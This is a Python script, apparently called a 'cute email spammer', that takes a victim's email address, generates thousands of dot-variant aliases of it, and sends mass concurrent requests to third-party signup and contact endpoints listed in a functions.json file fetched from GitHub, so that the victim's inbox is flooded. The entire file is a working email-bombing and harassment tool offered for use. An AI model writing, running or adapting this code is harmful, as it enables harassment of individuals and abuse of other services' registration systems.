import asyncio, aiohttp, time, re, random, string, itertools, os, json
from urllib.parse import urlencode

# CONFIG ^_^
size = 500 # threads per iteration
cap = None  # thread limit / set to None for unlimited (i do NOT recommend higher than 1000)

# skidded from chatgpt lololol!!
def generate_email_variants(email):
    username, domain = email.split("@")
    variants = []

    for i in range(1, len(username)):
        if len(variants) >= 9999:
            break
        for combo in itertools.combinations(range(1, len(username)), i):
            if len(variants) >= 9999:
                break
            variant = username
            for index in reversed(combo):
                if len(variants) >= 9999:
                    break
                variant = variant[:index] + '.' + variant[index:]
            variants.append(variant)

    results = [email] + list(
        sorted(dict.fromkeys([variant + "@" + domain
                              for variant in variants])))
    return results


# skidded from chelpus XD!!!!
def generate_username(length: int = 5):
    min_lc = ord('a')
    len_lc = 26
    ba = bytearray(os.urandom(length))
    for i, b in enumerate(ba):
        ba[i] = min_lc + b % len_lc
    return str(time.time()).replace(".", "") + ba.decode('ascii')


# skidded from regex ^_^
def validate_email(email):
    return re.match(r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", email)


# skidded from "Laurence Gonsalves" on stackoverflow
def clamp(value, min_value, max_value):
    return max(min_value, min(value, max_value))

def divide():
    print("-" * 20)


progress = 0


def update_progress():
    global progress
    progress += 1
    decimal = progress / total
    amount = 30
    white = "█" * int(amount - int((1 - decimal) * amount))
    black = "░" * int(amount - int(decimal * amount))
    print(f"⚡ {progress}/{total} {round(decimal*100, 1):.1f}%「{white}{black}」", end="\r")
    if progress >= total:
        print("\r")

status_codes = []

async def fetch(session: aiohttp.ClientSession, sub: str, info, name: str = None):
    def fix(lol):
        try:
            required = isinstance(lol, (dict, tuple, list))
            result = json.dumps(lol) if required else lol
            result = result.replace("{email}", sub).replace("{password}", password).replace("{random}", generate_username()).replace("{username}", generate_username()).replace("{frenchnumber}", str(random.randint(100_000_000, 999_999_999)))
            result = json.loads(result) if required else result
        except Exception:
            import traceback
            print(traceback.format_exc())
        return result
    try:
        url = fix(info.get("url"))
        method = info.get("method", "POST").upper()
        js = info.get("json", None)
        if js is not None:
            js = fix(js)
        data = info.get("data", None)
        if data is not None:
            data = fix(data)
        params = info.get("params", None)
        if params is not None:
            params = fix(params)
        headers = info.get("headers", None)
        cookies = info.get("cookies", None)
        async with session.request(
            method=method,
            url=url, 
            json=js,
            params=params,
            data=data,
            headers=headers,
            cookies=cookies
        ) as resp:
            if threads == 1:
                status = resp.status
                evaluation = "FAILURE" if status >= 400 else "SUCCESS"
                resp = await resp.text()
                resp = resp.strip().replace("\n", "").replace("\r", "").replace("\t", "")[:150]
                status_codes.append(f"{name or 'Unknown'} -- {method} -- {status} -- {evaluation}\nURL: {url}\nRESPONSE: {resp}")
    except Exception:
        pass
    update_progress()

async def main():
    async with aiohttp.ClientSession() as session:
        try:
            with open("functions.json", "r") as file:
                functions = json.load(file)
            with open("functions.json", "w") as file:
                json.dump(functions, file, indent=2)
        except Exception:
            print("no data found, downloading...")
            async with session.get("https://raw.githubusercontent.com/Inkthirsty/cute-email-spammer/main/functions.json") as resp:
                functions = await resp.json()
                print("beep boop data downloaded")
        # https://patorjk.com/software/taag/#p=display&h=1&v=1&f=Bloody&t=CUTE%20EMAIL%20SPAMMER
        print("""
        ▄████▄   █    ██ ▄▄▄█████▓▓█████    ▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓         ██████  ██▓███   ▄▄▄       ███▄ ▄███▓ ███▄ ▄███▓▓█████  ██▀███  
        ▒██▀ ▀█   ██  ▓██▒▓  ██▒ ▓▒▓█   ▀    ▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒       ▒██    ▒ ▓██░  ██▒▒████▄    ▓██▒▀█▀ ██▒▓██▒▀█▀ ██▒▓█   ▀ ▓██ ▒ ██▒
        ▒▓█    ▄ ▓██  ▒██░▒ ▓██░ ▒░▒███      ▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░       ░ ▓██▄   ▓██░ ██▓▒▒██  ▀█▄  ▓██    ▓██░▓██    ▓██░▒███   ▓██ ░▄█ ▒
        ▒▓▓▄ ▄██▒▓▓█  ░██░░ ▓██▓ ░ ▒▓█  ▄    ▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░         ▒   ██▒▒██▄█▓▒ ▒░██▄▄▄▄██ ▒██    ▒██ ▒██    ▒██ ▒▓█  ▄ ▒██▀▀█▄  
        ▒ ▓███▀ ░▒▒█████▓   ▒██▒ ░ ░▒████▒   ░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒   ▒██████▒▒▒██▒ ░  ░ ▓█   ▓██▒▒██▒   ░██▒▒██▒   ░██▒░▒████▒░██▓ ▒██▒
        ░ ░▒ ▒  ░░▒▓▒ ▒ ▒   ▒ ░░   ░░ ▒░ ░   ░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░   ▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░ ▒▒   ▓▒█░░ ▒░   ░  ░░ ▒░   ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░
        ░  ▒   ░░▒░ ░ ░     ░     ░ ░  ░    ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░   ░ ░▒  ░ ░░▒ ░       ▒   ▒▒ ░░  ░      ░░  ░      ░ ░ ░  ░  ░▒ ░ ▒░
        ░         ░░░ ░ ░   ░         ░         ░   ░      ░     ░   ▒    ▒ ░  ░ ░      ░  ░  ░  ░░         ░   ▒   ░      ░   ░      ░      ░     ░░   ░ 
        ░ ░         ░                 ░  ░      ░  ░       ░         ░  ░ ░      ░  ░         ░                 ░  ░       ░          ░      ░  ░   ░     
        ░                                                                                                                                                 
        """)
        global progress, total, password, threads
        password = ""
        samples = [string.ascii_lowercase, string.ascii_uppercase, string.digits]
        for _ in samples:
            password += "".join(random.sample(_, k=5))
        password = "!" + "".join(random.sample(password, k=len(password)))

        email = None
        while True:
            email = input("type cute email address here: ").strip().lower()
            if validate_email(email):
                break
            print("🤬 invalid email")

        variants = generate_email_variants(email)
        threads = None
        print("(i do NOT recommend more than 1000 threads)")
        while True:
            try:
                limit = clamp(len(variants), 1, cap or float("inf"))
                threads = input(f"threads per batch (1-{limit}): ")
                if threads == "":
                    threads = limit
                threads = clamp(int(threads), 1, limit)
                break
            except:
                print("🤬 that is not a number")

        variants = variants[:threads]
        total = len(functions) * len(variants)
        divide()
        print("📌 useless session info")
        info = {
            "THREADS": threads,
            "EMAIL": email,
            "PASSWORD": password,
            "DEBUG MODE": threads == 1,
        }
        print("\n".join([f"{k.upper()}: {v}" for k, v in info.items()]))
        divide()
        if threads == 1:
            lol = input("debug mode is active, type Y to only test the last function ").strip().lower()
            if lol == "y":
                total = 1
                functions = dict([next(reversed(functions.items()))])
        print(f"😼 sending some cute emails :3")
        print("🔋 initializing...", end="\r")
        start = time.time()
        tasks = [asyncio.create_task(fetch(session, sub, values, name)) for sub in variants for name, values in functions.items()]
        for j in range(0, len(tasks), size):
            await asyncio.gather(*tasks[j:j+size])
            await asyncio.sleep(1)
    if threads == 1:
        with open("results.txt", "w", encoding="utf-8") as file:
            file.write("\n\n".join(status_codes))
    print(f"🤣 attempted to send {total:,} emails in {round(time.time() - start, 3):.3f} seconds")
    print("😤 keep in mind that some emails can be delayed or never arrive")
    print("👋 have a nice day ^_^")
    await asyncio.sleep(10)  # intentional delay before the program commits suicide

if __name__ == "__main__":
    try:
        # real programmers would tell me this is unnecessary but i hate the constant "EVENT LOOP ENDED" errors so this shuts it up sometimes
        asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except Exception:
        pass
    asyncio.run(main())
